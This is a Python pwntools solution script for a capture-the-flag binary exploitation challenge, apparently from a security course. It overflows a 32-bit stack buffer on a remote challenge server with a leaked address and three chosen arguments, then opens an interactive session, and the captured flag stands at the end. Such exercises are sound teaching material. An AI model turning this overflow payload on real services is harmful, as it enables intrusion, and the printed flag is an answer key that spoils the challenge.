#!/usr/bin/env python3
import pwn
import vpn_conf

HOST = vpn_conf.HOST
PORT = int(vpn_conf.BASE_PORT + 10)
BIN = "./call_me_thaMilo"
OFFSET = 188
FIRST_PARAM = "0xb100d"
SECOND_PARAM = "0x5e1ec7ed"
THIRD_PARAM = "0x7ea"


def exploit():
    # p = pwn.process(BIN)
    p = pwn.remote(HOST, PORT)
    p.recvuntil(b":")
    p.sendline(b"Color me your color, baby")
    p.recvuntil(b":")
    p.sendline(b"Color me your car")
    p.recvuntil(b":")
    p.sendline(b"Color me your color, darling")
    leaked_address = p.recvuntil(b"target=")
    leaked_address = p.recvline().strip().decode()
    p.sendline(
        b"a" * OFFSET
        + pwn.p32(int(leaked_address, 16))
        + b"a" * 4
        + pwn.p32(int(FIRST_PARAM, 16))
        + pwn.p32(int(SECOND_PARAM, 16))
        + pwn.p32(int(THIRD_PARAM, 16))
    )
    p.interactive()


if __name__ == "__main__":
    exploit()

# BASC{you_g0t_the_args_right}
